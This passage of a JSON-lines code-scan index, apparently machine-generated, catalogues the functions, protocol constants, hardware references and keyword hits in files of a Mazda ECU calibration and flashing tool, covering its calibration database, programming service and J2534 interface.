"\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 221, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 261, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 343, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 347, "hardware": "vehicle", "content": "manufacturer_notes=\"Common on modified vehicles with aftermarket tuning\""}, {"type": "hardware", "line": 387, "hardware": "ECU", "content": "\"Fault present for 2 consecutive trips\""}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "\"No misfires detected for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 429, "hardware": "ECU", "content": "\"Fault present for 2 consecutive trips\""}, {"type": "hardware", "line": 432, "hardware": "ECU", "content": "\"No misfires detected in cylinder 1 for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 515, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 529, "hardware": "CAN bus", "content": "\"CAN bus communication failure\","}, {"type": "hardware", "line": 536, "hardware": "CAN bus", "content": "\"Check CAN bus communication with scan tool\","}, {"type": "hardware", "line": 543, "hardware": "CAN bus", "content": "\"Repair CAN bus wiring if damaged\","}, {"type": "hardware", "line": 549, "hardware": "CAN bus", "content": "\"CAN bus communication status\","}, {"type": "hardware", "line": 558, "hardware": "ECU", "content": "\"Communication restored with PCM for 3 consecutive drive cycles\","}], "security_logic": [{"type": "security_pattern", "line": 280, "pattern": "key", "content": "\"Test MAF sensor output voltage with key ON, engine OFF\","}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds4.py", "lines_read": 394, "features_found": [{"type": "function", "name": "__init__", "line": 62}, {"type": "function", "name": "_initialize_calibration_database", "line": 66}, {"type": "function", "name": "_get_maps_l3k9_18_881a", "line": 91}, {"type": "function", "name": "_get_parameters_l3k9_18_881a", "line": 207}, {"type": "function", "name": "_get_safety_limits_l3k9_18_881a", "line": 224}, {"type": "function", "name": "_get_maps_l3k9_18_881b", "line": 239}, {"type": "function", "name": "_get_parameters_l3k9_18_881b", "line": 255}, {"type": "function", "name": "_get_safety_limits_l3k9_18_881b", "line": 265}, {"type": "function", "name": "_initialize_ecu_database", "line": 274}, {"type": "function", "name": "get_calibration", "line": 301}, {"type": "function", "name": "get_calibration_map", "line": 305}, {"type": "function", "name": "get_ecu_info", "line": 312}, {"type": "function", "name": "list_all_calibrations", "line": 316}, {"type": "function", "name": "search_calibrations_by_vehicle", "line": 320}, {"type": "function", "name": "compare_calibrations", "line": 330}, {"type": "function", "name": "generate_calibration_report", "line": 364}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}], "components_found": [{"type": "class", "name": "CalibrationType", "line": 17}, {"type": "class", "name": "CalibrationMap", "line": 28}, {"type": "class", "name": "ECUCalibration", "line": 45}, {"type": "class", "name": "MazdaCalibrationDatabase", "line": 56}], "algorithms": [], "protocols": [{"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFA000,"}, {"type": "protocol", "line": 130, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFA800,"}, {"type": "protocol", "line": 163, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFB000,"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFB400,"}, {"type": "protocol", "line": 284, "protocol": "CAN", "content": "\"supported_protocols\": [\"CAN_11BIT\", \"KWP2000\"],"}, {"type": "protocol", "line": 284, "protocol": "KWP", "content": "\"supported_protocols\": [\"CAN_11BIT\", \"KWP2000\"],"}, {"type": "protocol", "line": 295, "protocol": "CAN", "content": "\"supported_protocols\": [\"CAN_11BIT\", \"KWP2000\"],"}, {"type": "protocol", "line": 295, "protocol": "KWP", "content": "\"supported_protocols\": [\"CAN_11BIT\", \"KWP2000\"],"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "MAZDA CALIBRATION DATABASE - Complete ECU Calibration Data"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "class ECUCalibration:"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "\"\"\"Complete ECU calibration definition\"\"\""}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "ecu_type: str"}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "Contains all ECU calibration data for 2011 Mazdaspeed 3"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "self.ecu_database = self._initialize_ecu_database()"}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "def _initialize_calibration_database(self) -> Dict[str, ECUCalibration]:"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "\"L3K9-18-881A\": ECUCalibration("}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "ecu_type=\"MZR 2.3L DISI TURBO - 2011 MAZDASPEED 3\","}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "\"L3K9-18-881B\": ECUCalibration("}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "ecu_type=\"MZR 2.3L DISI TURBO - 2011 MAZDASPEED 3 (Updated)\","}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "\"\"\"Get calibration maps for L3K9-18-881A ECU\"\"\""}, {"type": "hardware", "line": 274, "hardware": "ECU", "content": "def _initialize_ecu_database(self) -> Dict[str, Dict[str, Any]]:"}, {"type": "hardware", "line": 275, "hardware": "ECU", "content": "\"\"\"Initialize ECU hardware database\"\"\""}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "\"ecu_type\": \"MZR DISI TURBO\","}, {"type": "hardware", "line": 279, "hardware": "vehicle", "content": "\"vehicle_model\": \"MAZDASPEED 3 2011\","}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "\"ecu_type\": \"MZR DISI TURBO\","}, {"type": "hardware", "line": 290, "hardware": "vehicle", "content": "\"vehicle_model\": \"MAZDASPEED 3 2011\","}, {"type": "hardware", "line": 301, "hardware": "ECU", "content": "def get_calibration(self, calibration_id: str) -> Optional[ECUCalibration]:"}, {"type": "hardware", "line": 312, "hardware": "ECU", "content": "def get_ecu_info(self, hardware_number: str) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 313, "hardware": "ECU", "content": "\"\"\"Get ECU hardware information\"\"\""}, {"type": "hardware", "line": 314, "hardware": "ECU", "content": "return self.ecu_database.get(hardware_number)"}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "def search_calibrations_by_vehicle(self, vehicle_model: str) -> List[ECUCalibration]:"}, {"type": "hardware", "line": 320, "hardware": "vehicle", "content": "def search_calibrations_by_vehicle(self, vehicle_model: str) -> List[ECUCalibration]:"}, {"type": "hardware", "line": 321, "hardware": "vehicle", "content": "\"\"\"Search calibrations by vehicle model\"\"\""}, {"type": "hardware", "line": 323, "hardware": "ECU", "content": "for cal_id, ecu_info in self.ecu_database.items():"}, {"type": "hardware", "line": 324, "hardware": "ECU", "content": "if vehicle_model.lower() in ecu_info[\"vehicle_model\"].lower():"}, {"type": "hardware", "line": 324, "hardware": "vehicle", "content": "if vehicle_model.lower() in ecu_info[\"vehicle_model\"].lower():"}, {"type": "hardware", "line": 372, "hardware": "ECU", "content": "\"ecu_type\": calibration.ecu_type,"}], "security_logic": [{"type": "security_pattern", "line": 318, "pattern": "key", "content": "return list(self.calibration_database.keys())"}, {"type": "security_pattern", "line": 379, "pattern": "key", "content": "\"key_parameters\": calibration.parameters,"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds5.py", "lines_read": 515, "features_found": [{"type": "function", "name": "__init__", "line": 59}, {"type": "function", "name": "enter_programming_mode", "line": 65}, {"type": "function", "name": "_perform_programming_security_access", "line": 105}, {"type": "function", "name": "download_calibration", "line": 111}, {"type": "function", "name": "_request_download", "line": 153}, {"type": "function", "name": "_transfer_data_blocks", "line": 181}, {"type": "function", "name": "_transfer_data_block", "line": 214}, {"type": "function", "name": "_exit_download", "line": 241}, {"type": "function", "name": "upload_calibration", "line": 251}, {"type": "function", "name": "_request_upload", "line": 288}, {"type": "function", "name": "_upload_data_blocks", "line": 314}, {"type": "function", "name": "_upload_data_block", "line": 347}, {"type": "function", "name": "_exit_upload", "line": 360}, {"type": "function", "name": "verify_calibration", "line": 370}, {"type": "function", "name": "_find_data_differences", "line": 405}, {"type": "function", "name": "calculate_checksum", "line": 420}, {"type": "function", "name": "_calculate_checksum", "line": 424}, {"type": "function", "name": "read_ecu_identification", "line": 431}, {"type": "function", "name": "exit_programming_mode", "line": 467}, {"type": "function", "name": "get_programming_state", "line": 494}, {"type": "function", "name": "reset_ecu", "line": 498}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "ProgrammingSession", "line": 21}, {"type": "class", "name": "ProgrammingState", "line": 33}, {"type": "class", "name": "ProgrammingBlock", "line": 45}, {"type": "class", "name": "MazdaProgrammingService", "line": 53}], "algorithms": [{"type": "algorithm_function", "line": 420, "content": "def calculate_checksum(self, data: bytes) -> int:"}, {"type": "algorithm_function", "line": 424, "content": "def _calculate_checksum(self, data: bytes) -> int:"}], "protocols": [{"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER_ENTER = 0x01"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER_EXIT = 0x02"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "DOWNLOAD_REQUEST = 0x03"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "DOWNLOAD_TRANSFER = 0x04"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "DOWNLOAD_EXIT = 0x05"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "UPLOAD_REQUEST = 0x06"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "UPLOAD_TRANSFER = 0x07"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "UPLOAD_EXIT = 0x08"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "ROUTINE_CONTROL = 0x09"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "IDLE = 0x00"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER_ACTIVE = 0x01"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "DOWNLOAD_ACTIVE = 0x02"}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "UPLOAD_ACTIVE = 0x03"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "VERIFICATION_ACTIVE = 0x04"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "PROGRAMMING_ACTIVE = 0x05"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "COMPLETED = 0x06"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "ERROR = 0x07"}, {"type": "protocol", "line": 87, "protocol": "0x[0-9A-Fa-f]+", "content": "routine_id=0xFF00,  # Enter programming routine"}, {"type": "protocol", "line": 88, "protocol": "0x[0-9A-Fa-f]+", "content": "control_type=0x01,   # Start routine"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address: int = 0xFFA000) -> bool:"}, {"type": "protocol", "line": 164, "protocol": "0x[0-9A-Fa-f]+", "content": "data_format=0x00,  # No compression/encryption"}, {"type": "protocol", "line": 165, "protocol": "0x[0-9A-Fa-f]+", "content": "address_length=0x03,  # 3-byte addressing"}, {"type": "protocol", "line": 166, "protocol": "0x[0-9A-Fa-f]+", "content": "memory_size_length=0x03  # 3-byte length"}, {"type": "protocol", "line": 298, "protocol": "0x[0-9A-Fa-f]+", "content": "data_format=0x00,  # No compression/encryption"}, {"type": "protocol", "line": 299, "protocol": "0x[0-9A-Fa-f]+", "content": "address_length=0x03,  # 3-byte addressing"}, {"type": "protocol", "line": 300, "protocol": "0x[0-9A-Fa-f]+", "content": "memory_size_length=0x03  # 3-byte length"}, {"type": "protocol", "line": 422, "protocol": "0x[0-9A-Fa-f]+", "content": "return sum(data) & 0xFFFF"}, {"type": "protocol", "line": 428, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte) & 0xFFFF"}, {"type": "protocol", "line": 442, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_data = self.diagnostic_protocol.read_data_by_identifier(0xF101)"}, {"type": "protocol", "line": 447, "protocol": "0x[0-9A-Fa-f]+", "content": "part_data = self.diagnostic_protocol.read_data_by_identifier(0xF104)"}, {"type": "protocol", "line": 452, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_data = self.diagnostic_protocol.read_data_by_identifier(0xF102)"}, {"type": "protocol", "line": 457, "protocol": "0x[0-9A-Fa-f]+", "content": "sw_data = self.diagnostic_protocol.read_data_by_identifier(0xF106)"}, {"type": "protocol", "line": 476, "protocol": "0x[0-9A-Fa-f]+", "content": "routine_id=0xFF00,  # Exit programming routine"}, {"type": "protocol", "line": 477, "protocol": "0x[0-9A-Fa-f]+", "content": "control_type=0x02,   # Stop routine"}, {"type": "protocol", "line": 505, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.diagnostic_protocol.ecu_reset(reset_type=0x01)  # Hard reset"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "MAZDA PROGRAMMING SERVICES - Complete ECU Programming Implementation"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "\"\"\"ECU Programming Session Types\"\"\""}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "\"\"\"ECU Programming States\"\"\""}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "\"\"\"ECU Programming Data Block\"\"\""}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "Complete Mazda ECU Programming Service"}, {"type": "hardware", "line": 56, "hardware": "ECU", "content": "Handles all ECU programming and calibration flashing operations"}, {"type": "hardware", "line": 63, "hardware": "ECU", "content": "self.security_access = None"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "Enter ECU programming mode"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "This switches the ECU to bootloader for programming"}, {"type": "hardware", "line": 71, "hardware": "ECU", "content": "logger.info(\"Entering ECU programming mode...\")"}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "if not self._perform_programming_security_access():"}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "logger.error(\"Failed security access for programming\")"}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "def _perform_programming_security_access(self) -> bool:"}, {"type": "hardware", "line": 106, "hardware": "ECU", "content": "\"\"\"Perform security access for programming operations\"\"\""}, {"type": "hardware", "line": 114, "hardware": "ECU", "content": "Download calibration data to ECU"}, {"type": "hardware", "line": 154, "hardware": "ECU", "content": "\"\"\"Request download session with ECU\"\"\""}, {"type": "hardware", "line": 172, "hardware": "ECU", "content": "logger.debug(f\"ECU accepted download, max block: {self.max_block_length} bytes\")"}, {"type": "hardware", "line": 182, "hardware": "ECU", "content": "\"\"\"Transfer data in blocks to ECU\"\"\""}, {"type": "hardware", "line": 216, "hardware": "ECU", "content": "\"\"\"Transfer single data block to ECU\"\"\""}, {"type": "hardware", "line": 253, "hardware": "ECU", "content": "Upload calibration data from ECU"}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "\"\"\"Request upload session with ECU\"\"\""}, {"type": "hardware", "line": 305, "hardware": "ECU", "content": "logger.debug(f\"ECU accepted upload, max block: {self.max_block_length} bytes\")"}, {"type": "hardware", "line": 315, "hardware": "ECU", "content": "\"\"\"Upload data in blocks from ECU\"\"\""}, {"type": "hardware", "line": 348, "hardware": "ECU", "content": "\"\"\"Upload single data block from ECU\"\"\""}, {"type": "hardware", "line": 431, "hardware": "ECU", "content": "def read_ecu_identification(self) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 433, "hardware": "ECU", "content": "Read ECU identification information"}, {"type": "hardware", "line": 436, "hardware": "ECU", "content": "ECU identification data or None if failed"}, {"type": "hardware", "line": 439, "hardware": "ECU", "content": "ecu_info = {}"}, {"type": "hardware", "line": 444, "hardware": "ECU", "content": "ecu_info['vin'] = vin_data.decode('ascii', errors='ignore')"}, {"type": "hardware", "line": 449, "hardware": "ECU", "content": "ecu_info['part_number'] = part_data.hex().upper()"}, {"type": "hardware", "line": 454, "hardware": "ECU", "content": "ecu_info['calibration_id'] = cal_data.decode('ascii', errors='ignore')"}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "ecu_info['software_version'] = sw_data.hex().upper()"}, {"type": "hardware", "line": 461, "hardware": "ECU", "content": "return ecu_info if ecu_info else None"}, {"type": "hardware", "line": 464, "hardware": "ECU", "content": "logger.error(f\"Error reading ECU identification: {e}\")"}, {"type": "hardware", "line": 498, "hardware": "ECU", "content": "def reset_ecu(self) -> bool:"}, {"type": "hardware", "line": 500, "hardware": "ECU", "content": "Perform ECU reset after programming"}, {"type": "hardware", "line": 503, "hardware": "ECU", "content": "logger.info(\"Performing ECU reset...\")"}, {"type": "hardware", "line": 505, "hardware": "ECU", "content": "response = self.diagnostic_protocol.ecu_reset(reset_type=0x01)  # Hard reset"}, {"type": "hardware", "line": 507, "hardware": "ECU", "content": "logger.info(\"ECU reset command sent\")"}, {"type": "hardware", "line": 510, "hardware": "ECU", "content": "logger.error(\"ECU reset failed\")"}, {"type": "hardware", "line": 514, "hardware": "ECU", "content": "logger.error(f\"Error during ECU reset: {e}\")"}], "security_logic": [{"type": "security_pattern", "line": 13, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 63, "pattern": "security_access", "content": "self.security_access = None"}, {"type": "security_pattern", "line": 81, "pattern": "security_access", "content": "if not self._perform_programming_security_access():"}, {"type": "security_pattern", "line": 105, "pattern": "security_access", "content": "def _perform_programming_security_access(self) -> bool:"}, {"type": "security_pattern", "line": 164, "pattern": "encrypt", "content": "data_format=0x00,  # No compression/encryption"}, {"type": "security_pattern", "line": 298, "pattern": "encrypt", "content": "data_format=0x00,  # No compression/encryption"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds6.py", "lines_read": 444, "features_found": [{"type": "function", "name": "__init__", "line": 91}, {"type": "function", "name": "_load_j2534_library", "line": 102}, {"type": "function", "name": "_setup_function_prototypes", "line": 140}, {"type": "function", "name": "connect", "line": 189}, {"type": "function", "name": "connect_channel", "line": 209}, {"type": "function", "name": "disconnect", "line": 234}, {"type": "function", "name": "send_message", "line": 253}, {"type": "function", "name": "receive_message", "line": 274}, {"type": "function", "name": "set_protocol_parameters", "line": 297}, {"type": "function", "name": "_build_config_list", "line": 324}, {"type": "function", "name": "create_message_filter", "line": 336}, {"type": "function", "name": "_create_passthru_msg", "line": 369}, {"type": "function", "name": "read_vehicle_voltage", "line": 393}, {"type": "function", "name": "clear_buffers", "line": 418}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "platform", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "wintypes,", "line": null}, {"type": "import", "module": "time", "line": null}], "components_found": [{"type": "class", "name": "J2534Error", "line": 17}, {"type": "class", "name": "J2534Protocol", "line": 47}, {"type": "class", "name": "J2534Ioctl", "line": 61}, {"type": "class", "name": "J2534MessageFlag", "line": 78}, {"type": "class", "name": "J2534Interface", "line": 85}, {"type": "class", "name": "ConfigList", "line": 328}, {"type": "class", "name": "PassThruMsg", "line": 371}], "algorithms": [], "protocols": [{"type": "protocol", "line": 4, "protocol": "J2534", "content": "J2534 INTERFACE - Complete J2534 Pass-Thru Implementation"}, {"type": "protocol", "line": 5, "protocol": "J2534", "content": "Reverse engineered from Mazda IDS/M-MDS J2534 interface"}, {"type": "protocol", "line": 17, "protocol": "J2534", "content": "class J2534Error(IntEnum):"}, {"type": "protocol", "line": 18, "protocol": "J2534", "content": "\"\"\"J2534 Error Codes\"\"\""}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "STATUS_NOERROR = 0x00"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NOT_SUPPORTED = 0x01"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_CHANNEL_ID = 0x02"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_PROTOCOL_ID = 0x03"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NULL_PARAMETER = 0x04"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_IOCTL_VALUE = 0x05"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_FLAGS = 0x06"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_FAILED = 0x07"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_DEVICE_NOT_CONNECTED = 0x08"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_TIMEOUT = 0x09"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_MSG = 0x0A"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_TIME_INTERVAL = 0x0B"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_EXCEEDED_LIMIT = 0x0C"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_MSG_ID = 0x0D"}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_DEVICE_IN_USE = 0x0E"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_IOCTL_ID = 0x0F"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_BUFFER_EMPTY = 0x10"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_BUFFER_FULL = 0x11"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_BUFFER_OVERFLOW = 0x12"}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_PIN_INVALID = 0x13"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_CHANNEL_IN_USE = 0x14"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_MSG_PROTOCOL_ID = 0x15"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_FILTER_ID = 0x16"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NO_FLOW_CONTROL = 0x17"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_NOT_UNIQUE = 0x18"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_BAUDRATE = 0x19"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_INVALID_DEVICE_ID = 0x1A"}, {"type": "protocol", "line": 47, "protocol": "J2534", "content": "class J2534Protocol(IntEnum):"}, {"type": "protocol", "line": 48, "protocol": "J2534", "content": "\"\"\"J2534 Protocol IDs\"\"\""}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "J1850VPW = 0x01"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "J1850PWM = 0x02"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO9141 = 0x03"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO14230 = 0x04"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO15765 = 0x05"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_A_ENGINE = 0x06"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_A_TRANS = 0x07"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_B_ENGINE = 0x08"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "SCI_B_TRANS = 0x09"}, {"type": "protocol", "line": 58, "protocol": "CAN", "content": "CAN = 0x0A"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "CAN = 0x0A"}, {"type": "protocol", "line": 59, "protocol": "CAN", "content": "CAN_PS = 0x0B"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "CAN_PS = 0x0B"}, {"type": "protocol", "line": 61, "protocol": "J2534", "content": "class J2534Ioctl(IntEnum):"}, {"type": "protocol", "line": 62, "protocol": "J2534", "content": "\"\"\"J2534 IOCTL IDs\"\"\""}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "GET_CONFIG = 0x01"}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "SET_CONFIG = 0x02"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "READ_VBATT = 0x03"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "READ_PROG_VOLTAGE = 0x04"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "FIVE_BAUD_INIT = 0x05"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "FAST_INIT = 0x06"}, {"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_TX_BUFFER = 0x07"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_RX_BUFFER = 0x08"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_PERIODIC_MSGS = 0x09"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_MSG_FILTERS = 0x0A"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "CLEAR_FUNCT_MSG_LOOKUP_TABLE = 0x0B"}, {"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "ADD_TO_FUNCT_MSG_LOOKUP_TABLE = 0x0C"}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "DELETE_FROM_FUNCT_MSG_LOOKUP_TABLE = 0x0D"}, {"type": "protocol", "line": 76, "protocol": "0x[0-9A-Fa-f]+", "content": "READ_PROG_VOLTAGE_2 = 0x0E"}, {"type": "protocol", "line": 78, "protocol": "J2534", "content": "class J2534MessageFlag(IntEnum):"}, {"type": "protocol", "line": 79, "protocol": "J2534", "content": "\"\"\"J2534 Message Flags\"\"\""}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "TX_FLAG_NONE = 0x00"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "TX_FLAG_SCI_TX_VOLTAGE = 0x0080"}, 